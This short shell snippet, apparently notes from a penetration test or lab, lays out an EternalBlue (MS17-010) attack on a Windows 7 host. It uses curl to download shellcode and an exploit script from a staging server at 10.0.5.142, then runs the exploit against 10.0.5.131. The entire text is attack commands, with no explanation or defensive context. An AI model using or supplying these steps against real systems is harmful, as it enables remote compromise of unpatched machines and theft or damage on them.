#Download shellcode to exploit
curl -O http://10.0.5.142/sc_x64.bin

# Download served payload
curl -O http://10.0.5.142/eternalblue_exploit7.py

# Exploit MS17-010 Windows 7 (port 4444)
python eternalblue_exploit7.py 10.0.5.131 sc_x64.bin

